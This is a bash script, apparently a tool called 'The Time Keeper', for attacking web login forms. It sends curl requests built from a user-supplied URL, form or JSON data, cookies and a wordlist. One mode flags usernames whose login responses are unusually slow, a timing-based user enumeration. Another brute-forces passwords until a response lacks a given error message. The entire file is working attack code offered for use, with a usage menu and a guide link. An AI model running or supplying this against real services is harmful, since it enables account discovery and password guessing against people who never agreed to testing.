#!/bin/bash

############# GRAPHICS ###################

graphics() {
cat << "EOF"
[33m
â–‘â–€â–ˆâ–€â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–‘â–‘â–€â–ˆâ–€â–‘â–€â–ˆâ–€â–‘â–ˆâ–„â–ˆâ–‘â–ˆâ–€â–€â–‘â–‘â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–„
â–‘â–‘â–ˆâ–‘â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–€â–‘â–‘â–‘â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–‘â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–‘â–‘â–ˆâ–€â–„â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–„
â–‘â–‘â–€â–‘â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–‘â–‘â–‘â–€â–‘â–‘â–€â–€â–€â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–‘â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–€â–€â–€â–‘â–€â–‘â–‘â–‘â–€â–€â–€â–‘â–€â–‘â–€

 ______________________
(@7Ragnarok7;:;:.:. .  )
 T""""""""""""""""""""T
 |.;....,..........;..|
 |;;:: .  .    .      |
 l;;;:. :   .     ..  ;
 `;;:::.: .    .     .'
  l;;:. ..  .     .: ;
  `;;::.. .    .  ; .'
   l;;:: .  .    /  ;
    \;;:. .   .,'  /
     `\;:.. ..'  .'
       `\;:.. ..'
         \;:. /
          l; f
          `;f'
           ||
           ;l.
          ;: l
         / ;  \
       ,/  :   `.
     ./' . :     `.
    /' ,'  :       \
   f  /  . :        i
  ,' ;  .  :        `.
  f ;  .   :      .  i
 .'    :   :       . `.
 f ,  .    ;       :  i
 |    :  ,/`.       : |
 |    ;,/;:. `.     . |
 |___,/;;:. . .`._____|
(@7Ragnarok7;:;:.:. .  )
 """"""""""""""""""""""
[0m
EOF
}


############## USAGE INSTRUCTIONS ##################

print_usage() {
  printf "\e[32m
Usage:-

ttk -u url -d data -w wordlist 

Optional flags :-

-h (prints this help menu)
-s (use this to run ttk in silent mode)
-j (use this if the data is of json type)
-c (use this to provide cookies if any)
-b (use this to run ttk in bruteforcing mode)
-e error msg (*mandatory flag if using -b*, use this to provide an error msg) 

\e[34mFind complete guide to use this tool at: https://7ragnarok7.github.io/The-Time-Keeper/

\e[0m"
exit 1
}

echo

############### GETTING SHELL ARGUMENTS ################

while getopts 'u:d:w:c:e:jsbh' flags; do
  case ${flags} in
		b) brute='True' ;;
		c) cookies=${OPTARG} ;;
		d) data=${OPTARG} ;;
		e) error=${OPTARG} ;;
		h) print_usage ;;
		j) json='True' ;;
		s) silent='True' ;;
    u) url=${OPTARG} ;;
		w) wordlist=${OPTARG} ;;
    *) print_usage ;;
  esac
done

if ((test -z ${url+x} || test -z ${data+x} || test -z ${wordlist+x}) || (! test -z ${brute+x} && test -z ${error+x})); then
	echo -e "\e[31mRequired arguments not supplied!\e[0m"
	print_usage
fi

if (test -z $silent); then
	graphics
fi

################# CHECKING IF DATA IS OF JSON TYPE OR X-WWW-FORM-URLENCODE TYPE ###############################

if (! test -z $json); then
	header='-H Content-Type:application/json'
	params=($(echo $(echo $data | jq 'keys | .[]') | tr " " "\n" | sed 's/"//g'))
else
	temp=()
	values=()
	params=($(echo $data | tr "&" "\n"))
	for i in ${params[@]}
	do
		temp+=($(echo $i | cut -d '=' -f 1))
		values+=($(echo $i | cut -d '=' -f 2))
	done
	params=("${temp[@]}")
fi

len=${#params[@]}



############## CHECKING FOR COOKIES ##########################

if (! test -z ${cookies+x}); then
	cookies="--cookie $cookies"
fi

############### SELECTING THE PAYLOAD PARAMETER #############

contains() {
    [[ $1 =~ (^|[[:space:]])$2($|[[:space:]]) ]] && echo 0 || echo 1
}

if (($len >= 2)); then
	echo -e "\e[34mFound more than one data parameteres.\e[0m"
	while true
	do
		echo -ne "\e[1;33mChoose any one (\e[0m"
		for i in ${params[@]}
		do
			echo -ne "\e[1;33m$i, \e[0m"
		done
		echo -ne "\e[1;33m): \e[0m"
		read param
		if [[ " ${params[*]} " =~ " ${param} " ]]; then
			break
		fi
		echo -e "\e[31mInvalid Input!\e[0m"
	done
	params=$param
fi

############# MODIFYING THE DATA #################

if (! test -z $json); then
	value=$(echo $data | jq '."'"$params"'"')
else
	for i in "${!temp[@]}"; do
  	if [[ "${temp[$i]}" = "${params}" ]]; then
    	value="${values[i]}"
			break
		fi
	done
fi

modify() {
	if (! test -z $json); then
	newdata=${data//$value/\"$word\"}
else
	newdata=${data//$value/$word}
fi
}

########## PRINTING FUNCTION ##########

print() {
	if (test -z $silent); then
			echo -e "\e[37m$word: $time1\e[0m""\e[37ms\e[0m"
	fi
}

################## TESTING THE SERVER FOR AN AVG RESPONSE TIME ###############

testt() {
	if (test -z $silent); then
		echo -e "\n \e[31mTesting the target url.....\e[0m\n"
	fi
	words=("ryu" "nina" "bow" "katt" "jean") # yes the names are a reference to BOF 2 :)
	time=0
	for word in ${words[@]}
	do
		modify
		time1=$(curl $header $cookies -d "$newdata" -w "%{time_total}" -so /dev/null $url)
		print
		time=$(bc -l <<<${time}+${time1})	
	done
	time=$(bc -l <<<${time}/5)
	if (test -z $silent); then
		echo -e "\n\e[34mAverage response time: $time\e[0m""\e[34ms\e[0m"
	fi
}

############ SELECTING A THRESHOLD TIME #############

threshold(){
	time=$(bc -l <<<${time}*1.8)
	if (test -z $silent); then
		echo -e "\e[34mRecommended threshold time: $time\e[0m""\e[34ms\e[0m"
		read -p $'\x0a\e[1;33mContinue with the recommended? (Y/n): \e[0m' choice
		if [[ $choice == "n" || $choice == "N" ]]; then
			read -p $'\x0a\e[1;33mEnter a new threshold value: \e[0m' time
		fi
	fi
}

################ MAIN ########################

if (test -z $brute); then
	testt
	threshold
	out='-o /dev/null'
fi

main(){
	echo
	results=()
	while IFS= read -r word
	do
		modify
		time1=$(curl $header $cookies -d "$newdata" -w "%{time_total}" -s $out $url)
		if (test -z $brute); then
			print
			if (( $(echo "$time1 > $time" | bc -l) )); then
				if (test -z $silent); then
					echo -e "\n\e[32mProbable user found: $word\e[0m\n"
				fi
				results+=($word)
			fi
		else
			if (test -z $silent); then
				echo -e "\e[37m$word\e[0m"
			fi
			if [[ ! $time1 == *$error* ]]; then
				echo -e "\n\e[32mPassword found: $word\e[0m\n"
				exit 1
			fi
		fi
	done < "$wordlist"
	
	if (test -z $brute); then
		if (! test -z "$results"); then
			echo -en "\n\e[32mThe following probable users found: [\e[0m"
			for i in ${results[@]}
			do
				echo -ne "\e[32m$i, \e[0m"
			done
			echo -e "\e[32m] \n\e[0m"
		else
			echo -e "\n\e[31mNo users found!\e[0m\n"
		fi
	else
		echo -e "\n\e[31mPassword not found!\e[0m\n"
	fi
}

main
